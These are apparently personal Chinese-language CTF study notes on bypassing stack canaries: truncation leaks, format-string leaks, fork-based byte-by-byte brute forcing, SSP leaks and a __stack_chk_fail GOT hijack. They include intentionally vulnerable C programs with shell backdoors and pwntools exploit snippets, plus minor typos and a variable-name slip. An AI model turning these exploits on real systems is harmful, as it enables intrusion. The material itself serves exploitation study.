# 总结1

by Maple

写了这么久的题了，但是看到题还是一头雾水，完全在瞎碰，写个小总结，系统整理整理吧

**从保护开始**

## 1. Canary

### 1.1 原理

Canary就是在栈底放一个随机数，如果缓冲区变量溢出，那么这个随机数也会被篡改，当函数结束的时候会对这个随机数检查，如果发现这个随机数变了，就会执行`_stack_chk_fail`函数终止程序

从汇编角度看：函数序言会向保存调用函数的栈底指针，然后设置被调用函数自身的栈底指针，最后分配栈空间，这3条汇编指令标志着一个经典的函数序言

>  比如`buuctf`中的`bjdctf_2020_babyrop2`，有开启Canary保护，就存在这样的代码
>
> ```assembly
> mov     rbp, rsp
> sub     rsp, 20h
> mov     rax, fs:28h
> ```

但是Canary的非即时检测就留下了一定的操作空间：

只要可以让Canary在函数未结束前泄露出来，构造payload时在它本应在的位置写上Canary就可以了

所以问题就变为了如何泄露出来Canary，了解一下Canary随机值的特点

（或者修改指向`_stack_chk_fail`的地址，让函数走向后门函数）

- 一般Canary会在`ebp-0x8`处存储，

- 其最低位设置为`\x00`

  >  这里本意时为了保证字符串可以被`\x00`截断，从而保护其它字节信息

### 1.2绕过思路

#### 1.2.1 覆盖截断获取随机值

先填充缓冲区变量到Canary的最低字节，然后获取泄露的Canary，最后根据Canary的值填充`rbp-0x8`的位置，此后调用函数栈指针可以随意覆盖

假设有一个题目这样布局

```c
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
```

可以这样覆盖并泄露

```python
off_set = b'A'*(0x20-0x8)
p.sendline(off_set)
result = p.recvuntil(b'a'*(0x20-0x8)+b'\n')
canary = u64(b'\x00'+p.recv(7))
```

#### 1.2.2 格式化字符串直接泄露

格式化字符串可以完成任意位置读写操作，所以泄露Canary值也是很轻松的

以上面的例子来看

假设测试得到我们输入的内容在栈中第6个位置，并且栈顶到Canary的距离为`0x18(0x20-0x8)`

而一个不带长度的格式化字符会输出8/4个字节大小的数据，`0x18/0x8=3`,所以应该在第`6+3=9`位置处

payload如下：

```python
payload = b'%9$x'
p.sendline(payload)
canary = int(p.recvuntil('\n')[:-1],16)
```

#### 1.2.3 逐字节爆破绕过Canary

> 适用于有通过`fork()`函数创建的子进程的程序

某些题目中存在`fork()`函数，且程序开启了Canary函数，当程序进入到子进程的时候，**其Canary的值和父进程中Canary的值一样**（因为fork函数为拷贝父进程的内存），一次你在一定体哦阿健下我们可以将Canary爆破出来

需要的条件有：

- 程序中存在栈溢出的漏洞
- 可以覆盖到Canary的位置

> 对于32位程序，只需要对3字节进行爆破，爆破方式是先利用栈溢出复写次低字节，如果出错的化会报错并且重启子进程，获得正确的次低节点就不会报错，获取正确此地节点之后依次爆破次高字节和高字节

例程：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>  
#include <sys/wait.h>
 
void getshell(void)
{
    system("/bin/sh");
}
 
void init(void)
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
}
 
void vuln(void)
{
    char buf[100];
    memset(buf, 0, sizeof(buf));
    read(0, buf, 0x200);
    printf("%s\n", buf);
}
int main(void)
{
    init();
    while (1)
    {
        printf("Hello Hacker!\n");
        if (fork()) //father
        {
            wait(NULL);
        }
        else //child
        {
            vuln();
            exit(0);
        }
    }
 
    return 0;
}
```

`gcc pwn.c -no-pie -m32 -fstack-protector -z noexecstack -o pwn`编译

payload构造

```python
canary = b'\x00'
for i in range(3):
    for j in range(0,256):
        payload = b'a'*(0x70-0xC)+canary+p8(j)
        p.send(payload)
        # time.sleep(0.1)
        res = p.recv()
        if (b'stack smashing detected' not in res):
            print(f'the {i} is {hex(j)}')
            canary +=p8(j)
            break
    assert(len(canary) == i+2)
log.info('Canary；'+hex(u32((canary))))
```

#### 1.2.4 SSP泄露Canary

> 使用与Flag存储于内存空间中的情况

SSP全称为`Stack Smashing Protect`，这种方法可以读取内存中的值，当flag在内存中储存时，就可以用这个方法读取flag

直接看[这篇文章](https://www.anquanke.com/post/id/177832#h2-3)叭

#### 1.2.5 劫持`_stack_chk_fail`函数

如果Canary不对，程序会转到`stack_chk_fail`函数执行，而这个函数是一个普通的延迟绑定函数，可以通过修改GOT表来劫持这个函数

例程：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
void getshell(void)
{
    system("/bin/sh");
}
int main(int argc, char *argv[])
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
 
    char buf[100];
    read(0, buf, 200);#栈溢出
    printf(buf);
    return 0;
}
```

` gcc pwn.c -m32 -fstack-protector -no-pie -z noexecstack -z norelro -o pwn`编译

> - 劫持函数要修改GOT表，所以关闭RELRO
> - 调用`getshell`函数，关闭pie

我们直到GOT表中存的是函数的实际地址，如果把`_stack_chk_fail`函数的got表地址替换为`getshell`的地址，在canary出错的情况下，调用`_stack_chk_fail`时就会直接获取到shell

直接用`fmtstr_payload`就行

```python
_stack_chk_fail_got = elf.got['_stack_chk_fail']
backdoor = elf.sym['getshell']
payload = fmtstr_payload(10,{stack_chk_fail_got:backdoor})
payload = payload.ljust(0x70,b'a')
p.send(payload)
```

